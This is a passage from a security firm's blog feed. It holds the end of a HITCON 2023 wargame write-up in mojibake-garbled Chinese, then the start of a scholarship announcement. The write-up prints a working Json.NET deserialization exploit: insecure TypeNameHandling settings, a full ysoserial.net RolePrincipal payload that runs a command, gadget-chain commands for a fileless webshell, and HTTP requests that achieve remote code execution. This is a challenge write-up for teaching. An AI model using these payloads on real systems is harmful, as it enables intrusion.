ÁöÑÂÄºÔºåÊâÄ‰ª•ÂÅáÂ¶ÇÁ®ãÂºèÁ¢ºÊîπÂØ´ÁÇ∫Â¶Ç‰∏ãÁöÑÁ®ãÂºèÁ¢ºÊôÇÔºåÈÄôÂÄã Clone function Â∞áÊúÉËÆäÂæó exploitable„ÄÇ&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;you control the key&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;you control the value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MetadataPropertyHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MetadataPropertyHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadAhead&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊàëÂÄëÂèØ‰ª•‰æÜÂØ¶ÈöõÂà©Áî®‰∏ÄÂÄã gadget ÈÄ≤Ë°å code execution Ê∏¨Ë©¶ÔºåÈÄôÈÇäÊàë‰ΩøÁî® ysoserial.net Áî¢Áîü RolePrincipal gadget ÁöÑ payload ( &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ysoserial.exe -g RolePrincipal -f Json.Net -c calc&lt;/code&gt; )ÔºåÂõ†ÁÇ∫ÈÄôÂÄã gadget Âè™ÈúÄË¶ÅÊéßÂà∂ JSON ‰∏ÄÂ±§ÁöÑÂ≠ó‰∏≤Â∞±ÂèØ‰ª•Âü∑Ë°åÊåá‰ª§ÔºåÈ°åÁõÆÊÉÖÂ¢ÉÁõ∏Â∞çÂÆπÊòìÂª∫Êßã„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê∏¨Ë©¶Âü∑Ë°åÔºö&lt;/p&gt;
&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;System.Security.ClaimsPrincipal.Identities&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonSerializerSettings&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsonSerializerSettings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeNameHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;MetadataPropertyHandling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MetadataPropertyHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadAhead&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;JsonConvert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SerializeObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂòóË©¶Âü∑Ë°å‰ª•‰∏äÁ®ãÂºèÁ¢ºÂæåÔºåÊàêÂäüÂΩàÂá∫Ë®àÁÆóÊ©üÔºÅ
&lt;img src=&quot;/assets/img/blog/20230918/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Êó¢ÁÑ∂È©óË≠âÊ≠§Ë®≠ÂÆöÊòØÂèØ‰ª• exploit ÁöÑÔºåÂâ©‰∏ãÂ∞±ÊòØÂåÖË£ù‰∏ÄÂÄãÊáâÁî®Á®ãÂºèÁöÑÊÉÖÂ¢ÉÔºåËÄåÊúÄÁµÇË∂ïÂá∫ÁöÑÊàêÂìÅÂ∞±ÊòØ My todolist ÈÄôÈÅìÈ°åÁõÆ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁêÜË´ñ‰∏äÁõ¥Êé•‰ΩøÁî® RolePrincipal Â∞±ËÉΩÂü∑Ë°åÁ≥ªÁµ±Êåá‰ª§‰∫ÜÔºåÂè™ÊòØÈÄôÂÄã exploit Âü∑Ë°åÂæå‰∏çÊúÉÊúâ‰ªª‰ΩïÊåá‰ª§ÂõûÈ°ØÔºåËÄåÊàëÂÄëÈÇÑÈúÄË¶ÅÂòóË©¶ÊâæÂà∞‰∏¶ËÆÄÂèñ flagÔºåÁÇ∫‰∫ÜÂæåÁ∫åÊõ¥‰æøÂà©Êìç‰ΩúÔºåÊàëÂÄëÂèØ‰ª•ÂòóË©¶Â∞áÊºèÊ¥ûËΩâÊèõÊàê web shellÔºåË©≥Á¥∞ÂèØ‰ª•ÂèÉËÄÉÊàëÁöÑÂè¶‰∏ÄÁØáÊñáÁ´†„Äå&lt;a href=&quot;https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/&quot;&gt;Áé©ËΩâ ASP.NET VIEWSTATE ÂèçÂ∫èÂàóÂåñÊîªÊìä„ÄÅÂª∫Á´ãÁÑ°Ê™îÊ°àÂæåÈñÄÔºÅ&lt;/a&gt;„ÄçÔºå‰ΩÜÈÄôÂÄãÊñπÊ≥ïÁöÑ gadget ÊòØÈúÄË¶Å‰ΩøÁî® BinaryFormatter Âü∑Ë°å OnDeserialization callback ÈÄ≤ËÄåËß∏Áôº gadget chain ÁöÑÂü∑Ë°åÔºå‰ΩÜÂ¶ÇÊûú‰Ω†Êúâ clone ÊúÄÊñ∞ÁâàÊú¨ÁöÑ ysoserial.net ‰æÜËá™Ë°åÁ∑®Ë≠ØÁöÑË©±ÔºåÊúÉÁôºÁèæ help Ë®äÊÅØ‰∏≠Â§ö‰∫Ü‰∏ÄÂÄãÊñ∞ÁöÑÂèÉÊï∏ ‚Äìbgc„ÄÇ&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--bgc, --bridgedgadgetchains=VALUE
    Chain of bridged gadgets separated by comma (,). 
      Each gadget will be used to complete the next 
      bridge gadget. The last one will be used in the 
      requested gadget. This will be ignored when 
      using the searchformatter argument.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ê≤íÈåØÔºåÁÇ∫ÈÄôÂÄãÂ∞àÊ°àË≤¢ÁçªÁöÑÁ†îÁ©∂ËÄÖÂÄëÊàêÂäüÊâæÂà∞ gadget chain ÂØ¶ÁèæÂ∞á Json.NET Á≠âÈúÄË¶Å setter È°ûÂûãÁöÑ gadget ÁöÑ formatter ËΩâÊèõÊàê BinaryFormatter ÁöÑ‰∫åÊ¨°ÂèçÂ∫èÂàóÂåñÔºåÂæûËÄåÂèØ‰ª•Âü∑Ë°åÊõ¥Â§öÁöÑ gadgetÔºåÂÖ∂‰∏≠Áï∂ÁÑ∂Â∞±ÂåÖÊã¨  ActivitySurrogateDisableTypeCheck Âíå ActivitySurrogateSelectorFromFile ÈÄôÂÖ©ÂÄãÊúÄÈáçË¶ÅÁöÑ gadgetÔºåÊàëÂÄë‰πüÂõ†Ê≠§ÂèØ‰ª•ÂÜçÊ¨°‰ΩøÁî®ÈÄôÂÄãÂäüËÉΩÂØ¶ÁèæÂèçÂ∫èÂàóÂåñÊîªÊìäÂà∞ fileless webshell ÁöÑ exploitÔºÅ
Áî¢Áîü payload ÁöÑÊåá‰ª§Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-!&quot;&gt;ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateDisableTypeCheck -c 1

ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateSelectorFromFile -c &quot;.\ExploitClass.cs;dlls\System.dll;dlls\System.Web.dll&quot;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ÊúÄÂæåÈ°åÁõÆÂè™Ë¶ÅÂú®Ê≠£Â∏∏Ë®ªÂÜäÂæåÈö®‰æøÊñ∞Â¢û‰∏ÄÂÄã note ÈÄ≤Ë°å‰øÆÊîπÔºåÂÜçÂàÜÂà•Â∞çÂÖ©ÂÄã payload Âü∑Ë°å‰∏ÄÊ¨°È°û‰ºº‰∏ãÈù¢ÁöÑË´ãÊ±ÇÔºåÂ∞±ÂèØ‰ª•ÈÅîÊàêÊúâÂõûÈ°ØÁöÑ RCE ‰∫ÜÔºÅ&lt;/p&gt;

&lt;p&gt;Request 1:&lt;/p&gt;
&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/Api/UpdateTodo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost:8003&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;lt;session&amp;gt;&lt;/span&gt;

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&amp;amp;field=$type&amp;amp;value=System.Web.Security.RolePrincipal,+System.Web,+Version%3d4.0.0.0,+Culture%3dneutral,+PublicKeyToken%3db03f5f7f11d50a3a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Request 2:&lt;/p&gt;
&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/Api/UpdateTodo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost:8003&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;xx&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;lt;session&amp;gt;&lt;/span&gt;

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&amp;amp;field=System.Security.ClaimsPrincipal.Identities&amp;amp;value=&amp;lt;payload&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Request 3:&lt;/p&gt;
&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/Api/MyProfile&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost:8003&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;10&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;lt;session&amp;gt;&lt;/span&gt;

cmd=whoami
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
                <link>https://devco.re/blog/2023/09/18/hitcon-2023-devcore-wargame-my-todolist-writeup/</link>
                <guid>https://devco.re/blog/2023/09/18/hitcon-2023-devcore-wargame-my-todolist-writeup</guid>
                <pubDate>Mon, 18 Sep 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Ë¶ñ‰∫∫ÊâçÂüπËÇ≤ÁÇ∫Â∑±‰ªª„ÄÄDEVCORE ÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄÅË≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÁï´Âç≥Êó•Ëµ∑ÈñãÊîæÂ†±Âêç</title>
                <description>&lt;p&gt;DEVCORE ‰ªäÔºà30ÔºâÊó•Áî´ÊñºËºî‰ªÅÂ§ßÂ≠∏ËàâËæ¶„ÄåÊà¥Â§´ÂØáÁàæË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„Äç2023 Âπ¥Â∫¶È†íÁçéÂÖ∏Á¶ÆÔºåÂÖ±Êúâ 3 ‰ΩçË≥áÂ∑•Á≥ªÂêåÂ≠∏Áç≤Áçé„ÄÇÂêå‰∏ÄÊôÇÈñìÔºåÊàëÂÄëÂæàÈ´òËààÂú∞ÂÆ£‰ΩàÔºå‰ªäÂπ¥Â∫¶ÊàëÂÄë‰πüÂ∞áÁ∫åËæ¶„ÄåÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçÂèä„ÄåË≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÁï´„ÄçÔºåÂç≥Êó•Ëµ∑ÈñãÊîæÂ†±ÂêçÔºÅ&lt;/p&gt;

&lt;p&gt;ËøëÂπ¥‰æÜÔºåÁÑ°Ë´ñÊòØÊîøÂ∫úÊàñ‰ºÅÊ•≠ÔºåÂú®Êï∏‰ΩçÊµ™ÊΩÆÂèäÈõ≤‰∏ñ‰ª£ÁöÑÊé®Ê≥¢Âä©ÁÄæ‰∏ãÔºåÁÑ°‰∏çÈñãÂßãÊ≠£Ë¶ñË≥áÂÆâ‰∫∫ÊâçËçíÁöÑÂõ∞Â¢É„ÄÇËá™ 2012 Âπ¥ÂâµÁ´ã‰πãÂàùÔºåDEVCORE Âç≥ÁßâÊåÅËëóÊèêÂçáÂè∞ÁÅ£Ë≥áÂÆâÁ´∂Áà≠Âäõ„ÄÅËÆì‰∏ñÁïåÊõ¥ÂÆâÂÖ®ÁöÑÂàùË°∑ÔºåÂ∞á‰∫∫ÊâçÂüπËÇ≤Ë¶ñÁÇ∫Â∑±‰ªªÔºåÈÄèÈÅéÂèÉËàáÊïôËÇ≤ÈÉ®Ë≥áÂÆâ‰∫∫ÊâçÂüπËÇ≤Ë®àÁï´„ÄÅÂâµËæ¶ DEVCORE ÂØ¶ÁøíÁîüË®àÁï´„ÄÅÂïüÂãïÊà¥Â§´ÂØáÁàæË≥áÂÆâÁçéÂ≠∏Èáë„ÄÅËæ¶ÁêÜË≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÁï´Á≠âÊñπÂºèÔºåÂçîÂä©Ë≥áÂÆâ‰∫∫ÊâçËåÅÂ£ØÊàêÈï∑„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;devcore-ÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë&quot;&gt;DEVCORE ÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë&lt;/h3&gt;

&lt;p&gt;Êà¥Â§´ÂØáÁàæË≥áÂÆâÁçéÂ≠∏ÈáëÊñº 2020 Âπ¥È¶ñÊ¨°È†íÁôºÔºåÂéüÁÇ∫ÊÑüÂøµÈÅéÂéªÂú®Â≠∏ÁîüÊôÇ‰ª£ÊôÇÂèóÂà∞ÁöÑÂêÑÊñπË≥áÊ∫êÂèäÈºìÂãµÔºåÁçéÂ≠∏ÈáëÈ†íÁôºÁØÑÂúçÁÇ∫Á∂ìÁáüÂúòÈöäÊØçÊ†°ÁöÑËºî‰ªÅÂ§ßÂ≠∏ÂèäÂúãÁ´ãËá∫ÁÅ£ÁßëÊäÄÂ§ßÂ≠∏ÔºåÂæåÁÇ∫ÂüπËÇ≤Êõ¥Â§öÊúâÂøóÊñºÊ≠§ÁöÑÈùíÂπ¥Â≠∏Â≠êÔºåÊàëÂÄëÊñºÂéªÂπ¥Êì¥Â§ßÁçéÂ≠∏ÈáëÁØÑÂúçÔºåÈñãÊîæÂÖ®ÂúãÂêÑÂú∞ÁöÑË≥áÂÆâÊñ∞Èä≥Â†±ÂêçÁî≥Ë´ãÔºåÊúüÂæÖËÉΩÊé®Âª£„ÄåÈß≠ÂÆ¢ÊÄùÁ∂≠„Äç„ÄÅÂº∑ÂåñË≥áÂÆâÊäÄËÉΩÔºå‰∏¶Âπ´Âä©Âú®Â≠∏Â≠∏Áîü‰∫ÜËß£Ë≥áÂÆâÁî¢Ê•≠ÁîüÊÖãÂèäÁèæÊ≥Å„ÄÅÈôç‰ΩéÂ≠∏Áî®ËêΩÂ∑ÆÔºåÊú™‰æÜÊàêÁÇ∫Êñ∞‰∏Ä‰ª£ÁöÑÊîªÊìäÂûãË≥áÂÆâ‰∫∫ÊâçÔºåÁÇ∫Ë≥áÂÆâÁî¢Ê•≠Ê≥®ÂÖ•Êñ∞Ê¥ªÂäõ„ÄÇ&lt;/p&gt;

&lt;p&gt;„ÄåÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçÊ≠°ËøéÊâÄÊúâÂú®Ë≥áË®äÂÆâÂÖ®È†òÂüüÊúâÂá∫ÁúæÁ†îÁ©∂ÊàêÊûúÁöÑÂ≠∏ÁîüÂ†±ÂêçÁî≥Ë´ãÔºåÊúâÊÑèÁî≥Ë´ãËÄÖÈ†àÊèêÂá∫Â≠∏ÁøíË≥áÂÆâÁöÑÂãïÊ©üËàáÊ≠∑Á®ãÔºå‰∏¶Áπ≥‰∫§Ë≥áÂÆâÁ†îÁ©∂ÊàñÊØîË≥ΩÊàêÊûúÔºåÊàëÂÄëÂ∞áÂæû‰∏≠ÊìáÂÑ™ÈÅ∏Âèñ 10 ÂêçÔºåÁç≤ÈÅ∏ËÄÖÂèØÁç≤ÊúÄÈ´ò 2 Ëê¨ÂÖÉÁöÑÁ†îÁ©∂Ë£úÂä©„ÄÇË©≥Á¥∞Áî≥Ë´ãËæ¶Ê≥ïÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Áî≥Ë´ãË≥áÊ†ºÔºöÂÖ®ÂúãÂêÑÂ§ßÂ∞àÈô¢Ê†°Â≠∏ÁîüÁöÜÂèØ‰ª•Áî≥Ë´ã„ÄÇ&lt;/li&gt;
